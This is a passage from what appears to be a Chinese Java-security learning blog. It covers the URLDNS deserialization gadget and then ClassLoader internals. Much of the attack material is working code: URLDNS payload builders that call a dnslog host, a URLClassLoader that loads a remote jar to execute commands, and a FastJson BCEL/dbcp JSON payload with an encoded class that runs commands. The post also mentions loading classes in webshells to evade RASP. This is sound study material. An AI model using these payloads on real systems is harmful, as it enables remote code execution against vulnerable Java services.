hashCode 值，再和位移 16 位的结果进行异或得出 hash 值。\n也就是说，在反序列化一个 HashMap 时，会调用其中的 key 对象的 hashCode 方法计算 hash 值。如果反序列化一个 HashMap 对象中的 key 是URL对象，在反序列化时就会调用这个 URL 对象的 hashCode 方法，触发 DNS 解析查询。这个逻辑就是 URLDNS 这条反序列化利用的 gadget 的基本原理。\n注意点 1、在使用 HashMap 的 put 方法时，也是调用 putVal 方法，会对 key 进行 hash，触发解析。如果我们不想在生成 payload 时触发 DNS 解析，就要使用反射将值放进去。\n2、在 URL 对象有一个属性 hashCode，默认是 -1，使用hashCode 方法计算时会在 hashCode 属性中缓存已经计算过的值，如果再次计算将直接返回值，不会在触发 URLStreamHandler 的 hashCode 方法，也就不会触发漏洞。所以我们需要在生成的 HashMap 中的 URL 参数的 hashCode 值在反序列化时为 -1，而刚才说过，如果使用 put 方法，会调用一次 key 的 hash 计算，也就是 URL 的 hashCode 方法，这样就把 hashCode 缓存了，在反序列化时就不会触发 URLStreamHandler 的 hashCode 方法以及后面的逻辑。\n所以有两种思路解决这个问题：\n直接反射调用 HashMap 的 putVal 方法绕过 hash 计算。（由于 JDK 1.7 中方法名不一样，细节也不一样，所以不具有通用性） 使用HashMap的put方法，将URL对象放到HashMap的Key之前，先对其hashcode进行修改，使其不为-1,放入HashMap之后，通过反射将hashcode修改为-1。 第一种思路的代码实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class URLDNS { public static void main(String[] args) throws Exception { HashMap\u0026lt;URL, Integer\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); URL url = new URL(\u0026#34;http://reus09.zmz0xr.ceye.io\u0026#34;); Field f = Class.forName(\u0026#34;java.net.URL\u0026#34;).getDeclaredField(\u0026#34;hashCode\u0026#34;); f.setAccessible(true); f.set(url, 0x01010101); hashMap.put(url, 0); f.set(url, -1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;urldns.bin\u0026#34;)); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\u0026#34;urldns.bin\u0026#34;)); ois.readObject(); } } 第二种思路的代码实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public class URLDNS2 { public static void main(String[] args) throws Exception { HashMap\u0026lt;URL, Integer\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); URL url = new URL(\u0026#34;http://reus09.zmz0xr.ceye.io\u0026#34;); Method[] m = Class.forName(\u0026#34;java.util.HashMap\u0026#34;).getDeclaredMethods(); for (Method method : m) { if (method.getName().equals(\u0026#34;putVal\u0026#34;)) { method.setAccessible(true); method.invoke(hashMap, -1, url, 0, false, true); } } ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;urldns2.bin\u0026#34;)); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\u0026#34;urldns2.bin\u0026#34;)); ois.readObject(); } } 根据ceye提供的一个dnslog平台，我们可以验证是可以成功触发DNS解析的\n看一下ysoserial实现方法\n实际上就是继承了一个URLStreamHandler的类，在初始化 URL 对象时传入，那么在 HashMap 的 put 方法触发的 hash 计算在调用到 URLStreamHandler 的getHostAddress 方法时将调用我们自定义的 SilentURLStreamHandler 的 getHostAddress，不会触发 DNS 查询，而 put 之后则是通过反射将 URL 对象的 hashCode 的值重新改为 -1。\n总结 利用说明： 要构造这个Gadget，只需要初始化⼀个 java.net.URL 对象，作为 key 放在 java.util.HashMap 中；然后，设置这个 URL 对象的 hashCode 为初始值 -1 ，这样反序列化时将会重新计算 其 hashCode ，才能触发到后⾯的DNS请求，否则不会调⽤ URL-\u0026gt;hashCode() 。 Gadget 总结： kick-off gadget：java.util.HashMap#readObject() sink gadget：java.net.URL#hashCode() chain gadget：无 调用链展示： 1 2 3 4 5 6 7 8 HashMap.readObject() HashMap.put() HashMap.putVal() HashMap.hash() URL.hashCode() URLStreamHandler.hashCode() URLStreamHandler.getHostAddress() InetAddress.getByName() ","permalink":"http://www.reus09.top/posts/tech/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86urldns/","summary":"跟着su18师傅和p神继续学习Java安全，在之前对FastJson的分析中，FastJson的序列化漏洞主要是对对象反序列化过程中gett","title":"Java反序列化漏洞(一) 前置知识\u0026URLDNS"},{"content":"这篇主要记录一下对于classloader的学习。\n类加载机制 Java中的源码.java后缀文件会在运行前被编译成.class后缀文件，文件内的字节码的本质就是一个字节数组 ，它有特定的复杂的内部格式，Java类初始化的时候会调用java.lang.ClassLoader加载字节码，.class文件中保存着Java代码经转换后的虚拟机指令，当需要使用某个类时，虚拟机将会加载它的.class文件，并创建对应的class对象，将class文件加载到虚拟机的内存，而在JVM中类的查找与装载就是由ClassLoader完成的，而程序在启动的时候，并不会一次性加载程序所要用的所有class文件，而是根据程序的需要，来动态加载某个class文件到内存当中的，从而只有class文件被载入到了内存之后，才能被其它class所引用。所以ClassLoader就是用来动态加载class文件到内存当中用的。\nJVM架构图\n对于给定代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.reus.classloader; /** * @ClassName TestHelloWorld * @Description TODO * @Author reus09 * @Date 2022/10/18 20:01 * @Version 1.0 **/ public class TestHelloWorld { public String hello(){ return \u0026#34;hello world\u0026#34;; } } 通过javac TestHelloWorld.java 编译生成class文件。\n查看反汇编指令和二进制内存如下:\nJVM在执行TestHelloWorld之前会先解析class二进制内容，JVM执行的其实就是如上javap命令生成的字节码。\n类加载方式 之前在p神的Java安全漫谈中讲到反射的Class.forName(),这种属于显示加载类，隐式加载类通过ClassLoader来动态加载，new 一个类或者类名.方法名返回一个类\n代码如下：\n1 2 3 4 5 6 7 8 9 10 11 @Test public void loadClassTest() throws Exception { //1、反射加载 Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); System.out.println(aClass.getName()); //2、ClassLoader加载 Class\u0026lt;?\u0026gt; aClass1 = ClassLoader.getSystemClassLoader().loadClass(\u0026#34;java.lang.ProcessBuilder\u0026#34;); System.out.println(aClass1.getName()); } 那也就是其实可以通过ClassLoader.loadClass()代替Class.forName()来获取某个类的class对象。\n但是ClassLoader.loadClass()的作用和Class.forName()中initalize=flase一样，无法进行类加载过程中的链接过程，自然无法进行静态方法、静态代码块的初始化。\nClassLoader 一切的Java类都必须经过JVM加载后才能运行，而ClassLoader的主要作用就是Java类文件的加载。在JVM类加载器中最顶层的是Bootstrap ClassLoader（引导类加载器）、Extension ClassLoader（扩展类加载器）、App ClassLoader（系统类加载器），AppClassLoader是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用AppClassLoader加载类，ClassLoader.getSystemClassLoader()返回的系统类加载器也是AppClassLoader。\n值得注意的是某些时候我们获取一个类的类加载器时候可能会返回一个null值，如:java.io.File.class.getClassLoader()将返回一个null对象，因为java.io.File类在JVM初始化的时候会被Bootstrap ClassLoader（引导类加载器）加载（该类加载器实现于JVM层，采用C++编写），我们在尝试获取被Bootstrap ClassLoader类加载器所加载的类的ClassLoader时候都会返回null。\nClassLoader类有如下核心方法：\nloadClass（加载指定的Java类） findClass（查找指定的Java类） findLoadedClass（查找JVM已经加载过的类） defineClass（定义一个Java类） resolveClass（链接指定的Java类） ClassLoader类加载过程 ClassLoader加载com.reus09.classloader.TestHelloWorld类重要流程如下：\nClassLoader会调用public Class\u0026lt;?\u0026gt; loadClass(String name)方法加载com.anbai.sec.classloader.TestHelloWorld类。 调用findLoadedClass方法检查TestHelloWorld类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。 如果创建当前ClassLoader时传入了父类加载器（new ClassLoader(父类加载器)）就使用父类加载器加载TestHelloWorld类，否则使用JVM的Bootstrap ClassLoader加载。 如果上一步无法加载TestHelloWorld类，那么调用自身的findClass方法尝试加载TestHelloWorld类。 如果当前的ClassLoader没有重写了findClass方法，那么直接返回类加载失败异常。如果当前类重写了findClass方法并通过传入的com.anbai.sec.classloader.TestHelloWorld类名找到了对应的类字节码，那么应该调用defineClass方法去JVM中注册该类。 如果调用loadClass的时候传入的resolve参数为true，那么还需要调用resolveClass方法链接类，默认为false。 返回一个被JVM加载后的java.lang.Class类对象。 简而言之，加载过程就是先检查jvm是否已初始化，然后检查用什么加载器进行加载，最后都不行的话就用findClass方法进行加载。\n同时，这里讲一下classloader加载过程中的双亲委派机制\n双亲委派简单理解：向上委派，向下加载\n当一个.class文件要被加载时。不考虑我们自定义类加载器，首先会在AppClassLoader中检查是否加载过，如果有那就无需再加载了。如果没有，那么会拿到父加载器，然后调用父加载器的loadClass方法。父类中同理也会先检查自己是否已经加载过，如果没有再往上。注意这个类似递归的过程，直到到达Bootstrap classLoader之前，都是在检查是否加载过，并不会选择自己去加载。直到BootstrapClassLoader，已经没有父加载器了，这时候开始考虑自己是否能加载了（向上委派）; 如果自己无法加载，会下沉到子加载器去加载，一直到最底层（向下加载）。如果没有任何加载器能加载，就会抛出ClassNotFoundException异常。\n自定义classloader java.lang.ClassLoader是所有的类加载器的父类，java.lang.ClassLoader有非常多的子类加载器，比如我们用于加载jar包的java.net.URLClassLoader其本身通过继承java.lang.ClassLoader类，重写了findClass方法从而实现了加载目录class文件甚至是远程资源文件。\n既然已知ClassLoader具备了加载类的能力，那么我们不妨尝试下写一个自己的类加载器来实现加载自定义的字节码（这里以加载TestHelloWorld类为例）并调用hello方法。\n如果com.reus09.classloader.TestHelloWorld类存在的情况下，我们可以使用如下代码即可实现调用hello方法并输出：\n1 2 3 TestHelloWorld t = new TestHelloWorld(); String str = t.hello(); System.out.println(str); 但是如果com.reus09.classloader.TestHelloWorld根本就不存在于我们的classpath，那么我们可以使用自定义类加载器重写findClass方法，然后在调用defineClass方法的时候传入TestHelloWorld类的字节码的方式来向JVM中定义一个TestHelloWorld类，最后通过反射机制就可以调用TestHelloWorld类的hello方法了。\n关键是重写findClass以及defineClass的参数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package com.reus.classloader; import java.io.IOException; import java.lang.reflect.Member; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; import java.util.Arrays; /** * @ClassName TestClassloader * @Description TODO * @Author reus09 * @Date 2022/10/18 20:06 * @Version 1.0 **/ public class TestClassloader extends ClassLoader{ private static String testClassName = \u0026#34;com.reus.classloader.TestHelloWorld\u0026#34;; private static byte[] testClassBytes = new byte[] { -54, -2, -70, -66, 0, 0, 0, 52, 0, 28, 10, 0, 6, 0, 14, 9, 0, 15, 0, 16, 8, 0, 17, 10, 0, 18, 0, 19, 7, 0, 20, 7, 0, 21, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 7, 0, 8, 7, 0, 22, 12, 0, 23, 0, 24, 1, 0, 12, 72, 101, 108, 108, 111, 32, 119, 111, 114, 108, 100, 33, 7, 0, 25, 12, 0, 26, 0, 27, 1, 0, 35, 99, 111, 109, 47, 114, 101, 117, 115, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 3, 111, 117, 116, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 1, 0, 7, 112, 114, 105, 110, 116, 108, 110, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 0, 33, 0, 5, 0, 6, 0, 0, 0, 0, 0, 2, 0, 1, 0, 7, 0, 8, 0, 1, 0, 9, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11, 0, 8, 0, 1, 0, 9, 0, 0, 0, 37, 0, 2, 0, 1, 0, 0, 0, 9, -78, 0, 2, 18, 3, -74, 0, 4, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 10, 0, 2, 0, 0, 0, 13, 0, 8, 0, 14, 0, 1, 0, 12, 0, 0, 0, 2, 0, 13 }; @Override public Class\u0026lt;?\u0026gt; findClass(String name) throws ClassNotFoundException { if (name.equals(testClassName)){ return defineClass(testClassName,testClassBytes,0,testClassBytes.length); } return super.findClass(name); } public static void main(String[] args) throws IOException { // byte[] code = Files.readAllBytes(Paths.get(\u0026#34;/Users/reus09/Desktop/JavaSec/konwledge/src/main/java/com/reus/classloader/TestHelloWorld.class\u0026#34;)); // System.out.println(Arrays.toString(code)); TestClassloader testClassloader = new TestClassloader(); try { Class testClass = testClassloader.loadClass(testClassName); Object instance = testClass.newInstance(); Method method = instance.getClass().getMethod(\u0026#34;hello\u0026#34;); String str = (String) method.invoke(instance); System.out.println(str); // Class testClass1 = Class.forName(testClassName); System.out.println(instance.getClass().getClassLoader()); Class testClass2 = ClassLoader.getSystemClassLoader().loadClass(testClassName); System.out.println(testClass2.getClassLoader()); // System.out.println(testClass1.getClassLoader()); }catch (Exception e){ e.printStackTrace(); } } } 利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象，比如本地命令执行漏洞调用自定义类字节码的native方法绕过RASP检测，也可以用于加密重要的Java类字节码（只能算弱加密了）。\n之后在很多反序列化构造链的构造中，也需要用到自定义加载器这个特性。\n类加载隔离 创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两则必须是非继承关系），同级ClassLoader跨类加载器调用方法时必须使用反射。\n跨类加载器调用类方法时需要特别注意一个基本原则：ClassLoader A和ClassLoader B可以加载相同类名的类，但是ClassLoader A中的Class A和ClassLoader B中的Class A是完全不同的对象，两者之间调用只能通过反射。\n代码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 package com.reus.classloader; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; /** * @ClassName TestCrossClassLoader * @Description TODO * @Author reus09 * @Date 2022/10/18 20:37 * @Version 1.0 **/ public class TestCrossClassLoader { private static String testClassName = \u0026#34;com.reus.classloader.TestHelloWorld\u0026#34;; private static byte[] testClassBytes = new byte[] { -54, -2, -70, -66, 0, 0, 0, 52, 0, 28, 10, 0, 6, 0, 14, 9, 0, 15, 0, 16, 8, 0, 17, 10, 0, 18, 0, 19, 7, 0, 20, 7, 0, 21, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 7, 0, 8, 7, 0, 22, 12, 0, 23, 0, 24, 1, 0, 12, 72, 101, 108, 108, 111, 32, 119, 111, 114, 108, 100, 33, 7, 0, 25, 12, 0, 26, 0, 27, 1, 0, 35, 99, 111, 109, 47, 114, 101, 117, 115, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 3, 111, 117, 116, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 1, 0, 7, 112, 114, 105, 110, 116, 108, 110, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 0, 33, 0, 5, 0, 6, 0, 0, 0, 0, 0, 2, 0, 1, 0, 7, 0, 8, 0, 1, 0, 9, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11, 0, 8, 0, 1, 0, 9, 0, 0, 0, 37, 0, 2, 0, 1, 0, 0, 0, 9, -78, 0, 2, 18, 3, -74, 0, 4, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 10, 0, 2, 0, 0, 0, 13, 0, 8, 0, 14, 0, 1, 0, 12, 0, 0, 0, 2, 0, 13 }; public static class ClassLoaderA extends ClassLoader{ public ClassLoaderA(ClassLoader parent) { super(parent); } { defineClass(testClassName,testClassBytes,0, testClassBytes.length); } } public static class ClassLoaderB extends ClassLoader{ public ClassLoaderB(ClassLoader parent) { super(parent); } { defineClass(testClassName,testClassBytes,0, testClassBytes.length); } } public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { // 父类加载器 ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader(); // A类加载器 ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader); // B类加载器 ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader); // 使用A/B类加载器加载同一个类 Class\u0026lt;?\u0026gt; aClass = Class.forName(testClassName, true, aClassLoader); Class\u0026lt;?\u0026gt; aaClass = Class.forName(testClassName, true, aClassLoader); Class\u0026lt;?\u0026gt; bClass = Class.forName(testClassName, true, bClassLoader); // 比较A类加载和B类加载器加载的类是否相等 System.out.println(\u0026#34;aClass == aaClass：\u0026#34; + (aClass == aaClass)); System.out.println(\u0026#34;aClass == bClass：\u0026#34; + (aClass == bClass)); System.out.println(\u0026#34;\\n\u0026#34; + aaClass.getName() + \u0026#34;:方法清单\u0026#34;); // 获取该类所有方法 Method[] methods = aClass.getMethods(); for (Method method : methods){ System.out.println(method); } // 创建实例 Object object = aClass.newInstance(); // 获取方法 Method method = object.getClass().getMethod(\u0026#34;hello\u0026#34;); // 执行方法 String result = (String) method.invoke(object); System.out.println(result); } } 输出如下\nClassLoader攻击 URLClassLoader URLClassLoader继承了ClassLoader，URLClassLoader提供了加载远程资源的能力，在写漏洞利用的payload或者webshell的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。\n如果说我们的恶意payload可以远程加载我们的远程恶意jar包，即可实现RCE。\n代码如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 package com.reus.classloader; import java.io.ByteArrayOutputStream; import java.io.InputStream; import java.net.URL; import java.net.URLClassLoader; /** * @ClassName TestUrlClassLoader * @Description TODO * @Author reus09 * @Date 2022/10/18 20:31 * @Version 1.0 **/ public class TestUrlClassLoader { public static void main(String[] args) { try { // 定义远程加载的jar路径 URL url = new URL(\u0026#34;http://127.0.0.1:8000/cmd.jar\u0026#34;); // 创建URLClassLoader对象，并加载远程jar包 URLClassLoader ucl = new URLClassLoader(new URL[]{url}); // 定义需要执行的系统命令 String cmd = \u0026#34;ls\u0026#34;; // 通过URLClassLoader加载远程jar包中的CMD类 Class cmdClass = ucl.loadClass(\u0026#34;CMD\u0026#34;); // 调用CMD类中的exec方法，等价于: Process process = CMD.exec(\u0026#34;whoami\u0026#34;); Process process = (Process) cmdClass.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(null, cmd); // 获取命令执行结果的输入流 InputStream in = process.getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; // 读取命令执行结果 while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } // 输出命令执行结果 System.out.println(baos.toString()); } catch (Exception e) { e.printStackTrace(); } } } CMD.jar包里面中就一个CMD.class文件，对应的编译之前的代码片段如下：\n1 2 3 4 5 6 7 8 import java.io.IOException; public class CMD { public static Process exec(String cmd) throws IOException { return Runtime.getRuntime().exec(cmd); } } 程序执行结果如下：\nBCEL ClassLoader BCEL（Apache Commons BCEL™）是一个用于分析、创建和操纵Java类文件的工具库，Oracle JDK引用了BCEL库，不过修改了原包名org.apache.bcel.util.ClassLoader为com.sun.org.apache.bcel.internal.util.ClassLoader，BCEL的类加载器在解析类名时会对ClassName中有$$BCEL$$标识的类做特殊处理，该特性经常被用于编写各类攻击Payload。\nBCEL攻击原理 当BCEL的com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass加载一个类名中带有$$BCEL$$的类时会截取出$$BCEL$$后面的字符串，然后使用com.sun.org.apache.bcel.internal.classfile.Utility#decode将字符串解析成类字节码（带有攻击代码的恶意类），最后会调用defineClass注册解码后的类，一旦该类被加载就会触发类中的恶意代码，正是因为BCEL有了这个特性，才得以被广泛的应用于各类攻击Payload中。\nBCEL编码：\n1 2 3 4 private static final byte[] CLASS_BYTES = new byte[]{类字节码byte数组}]; // BCEL编码类字节码 String className = \u0026#34;$$BCEL$$\u0026#34; + com.sun.org.apache.bcel.internal.classfile.Utility.encode(CLASS_BYTES, true); 编码后的类名：$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85S$dbn$d......，BCEL会对类字节码进行编码，\nBCEL解码：\n1 2 3 4 5 int index = className.indexOf(\u0026#34;$$BCEL$$\u0026#34;); String realName = className.substring(index + 8); // BCEL解码类字节码 byte[] bytes = com.sun.org.apache.bcel.internal.classfile.Utility.decode(realName, true); 如果被加载的类名中包含了$$BCEL$$关键字，BCEL就会使用特殊的方式进行解码并加载解码之后的类。\nBCEL兼容性问题 BCEL这个特性仅适用于BCEL 6.0以下，因为从6.0开始org.apache.bcel.classfile.ConstantUtf8#setBytes就已经过时了，如下：\n1 2 3 4 5 6 7 8 /** * @param bytes the raw bytes of this Utf-8 * @deprecated (since 6.0) */ @java.lang.Deprecated public final void setBytes( final String bytes ) { throw new UnsupportedOperationException(); } Oracle自带的BCEL是修改了原始的包名，因此也有兼容性问题，已知支持该特性的JDK版本为：JDK1.5 - 1.7、JDK8 - JDK8u241、JDK9。\nBCEL FastJson攻击链分析 Fastjson（1.1.15 - 1.2.24）可以使用其中有个dbcp的Payload就是利用了BCEL攻击链，利用代码如下：\n1 2 3 4 5 6 { \u0026#34;@type\u0026#34;:\u0026#34;org.apache.commons.dbcp.BasicDataSource\u0026#34;, \u0026#34;driverClassName\u0026#34;:\u0026#34;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85R$5bO$TA$U$fe$a6$z$dde$bbXX$$$e2$F$z$8aPJ$e9r$x$X$r$3e$d8$60$a2$U1$b6$b1$89o$d3$e9$a4$ynw$9b$dd$a9$c2$l1$f1$X$f0$cc$L$S$l$fc$B$fe$p$l4$9e$5d$h$U$rqvsf$ce7$e7$7c$e7$9b$99$f3$f5$c7$e7$_$AV$b0i$m$8b$9b$3an$e9$b8m$60$Kwt$dc5$90$c3$b4$8e$7b$3a$ee$eb$981$f0$A$b3$91$99$d3$907$60b$5eCA$c3$CCz$db$f1$i$f5$98$n$99$9f$7f$cd$90$aa$f8$z$c9$90$ad$3a$9e$7c$d1$eb4eP$e7M$97$Q$7d$5b$b8$fd$c8$a1$9a$e2$e2$ed$k$ef$c6$5b$g$8a$c4$c9$60$d4$fc$5e$m$e4S$t$8a$b6$ea2TO$w$3b$d5$8a$cb$c3$b0t$c8$dfq$T$c3$Ya$98$f0$bb$d2$cb$z$f2$5c$85$bb$a2$e7r$e5$H$r$de$ed2h$7eX$f2x$87$f8$WM$94$60$T$d2p$bc$96$ff$3e$a4$K$s$96$b0L$c9$82$92r$cb$x$abk$e5$f5$8d$cd$ad$a5$fe$8aa$80$f4$f6$8e$Y$c6D$_ps$aeOq$H$7e$a8$kn$d1$b05$ac$98X$c5$9a$892$d6$ZF$p5$b6$e3$db$cf$f6w$8e$84$ec$w$c7$f7LlD$e2$e6$84$df$b1$b9$d7$e4$8e$jJa$8bH$bc$eb$f3$96$M$ecK$Hb$Y$8eI$5c$ee$b5$ed$fd$e6$a1$U$ea$STS$81$e3$b5$_C$c7$a1$92$j$86L$5b$aa$97$B$5dB$a0$8e$Zf$f3$d5$bf$b3$k$cd$ff$L$d1$ed$86$8a$H$wl8$ea$80a$fc$aa$ac7$M$p$bf$d1W$3dO9$jz$J$83$ea$5d8$e3$f9$3f$c9$fb0$b1$a7$e4$91$Ut$fc$ff$a8$n$ddB$86$n$rd$bb$b4$a9$e2$3e$a8$H$5cHL$e3$g$f5$604$S$60$d1K$93$b5$c8$9b$a2$99$d1$3cP$f8$EvJ$L$ba$7f$b2$e9_$mt$8c$5d$84$7e$a0$d4$q$cde$x$b1k$r$cf$91$aa$$X$DgH$7f$c4$a0$a5$ed$9e$m$bb$60$e9$b1$9b$b6$Gw$cfa$U$ce$90i$9c$40$df$x$9ea$e8$94HfP$84M$bd$9d$88K$94$90$n$ab$T$e5$m$7d$Z$wab$SC$b1$d2$Z$f2$8a$Y$a7$e8Qj$ac1$aca$82$3c$90$97$fa$8eI$N$T$f4g$9ek$b8$fe$N$v$o$9e$8c$8fu$e3$t$b2$b7e$b6p$D$A$A\u0026#34;, \u0026#34;driverClassLoader\u0026#34;: {\u0026#34;@type\u0026#34;:\u0026#34;org.apache.bcel.util.ClassLoader\u0026#34;} } FastJson自动调用setter方法修改org.apache.commons.dbcp.BasicDataSource类的driverClassName和driverClassLoader值，driverClassName是经过BCEL编码后的com.reus.classloader.Calc类字节码，driverClassLoader是一个由FastJson创建的org.apache.bcel.util.ClassLoader实例。\nFastJson自动调用setter方法修改org.apache.commons.dbcp.BasicDataSource类的driverClassName和driverClassLoader值，driverClassName是经过BCEL编码后的com.anbai.sec.classloader.TestBCELClass类字节码，driverClassLoader是一个由FastJson创建的org.apache.bcel.util.ClassLoader实例。\nCalc类代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class Calc { static { String command = \u0026#34;open -a Calculator.app\u0026#34;; String osName = System.getProperty(\u0026#34;os.name\u0026#34;); if (osName.startsWith(\u0026#34;Windows\u0026#34;)) { command = \u0026#34;calc 12345678901234567\u0026#34;; } else if (osName.startsWith(\u0026#34;Linux\u0026#34;)) { command = \u0026#34;curl localhost:9999/\u0026#34;; } try { Runtime.getRuntime().exec(command); } catch (IOException e) { e.printStackTrace(); } } } 从JSON反序列化实现来看，只是注入了类名和类加载器并不足以触发类加载，导致命令执行的关键问题就在于FastJson会自动调用getter方法，org.apache.commons.dbcp.BasicDataSource本没有connection成员变量，但有一个getConnection()方法，按理来讲应该不会调用getConnection()方法，但是FastJson会通过getConnection()这个方法名计算出一个名为connection的field，详情参见：com.alibaba.fastjson.util.TypeUtils#computeGetters，因此FastJson最终还是调用了getConnection()方法。在getConnection()方法中，会调用createDataSource().getConnection(),在createDataSource()方法中调用了createConnectionFactory方法，在该方法中通过Class.forName()实现了对我们传入的classloader和对应的class文件加载，从而实现攻击。\n因为使用了反射的方式加载com.anbai.sec.classloader.Calc类，而且还特意指定了需要初始化类（Class.forName(driverClassName, true, driverClassLoader);），因此该类的静态语句块（static{...}）将会被执行，完整的攻击示例代码如下：\n最终的攻击代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 package com.reus.classloader; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.sun.org.apache.bcel.internal.classfile.Utility; import org.apache.commons.dbcp.BasicDataSource; import org.apache.bcel.util.ClassLoader; // import org.javaweb.*; import java.io.File; import java.io.IOException; import java.util.LinkedHashMap; import java.util.Map; public class BCELClassLoader { /** * com.anbai.sec.classloader.TestBCELClass类字节码，Windows和MacOS弹计算器，Linux执行curl localhost:9999 * \u0026lt;/pre\u0026gt; */ private static final byte[] CLASS_BYTES = new byte[]{ -54, -2, -70, -66, 0, 0, 0, 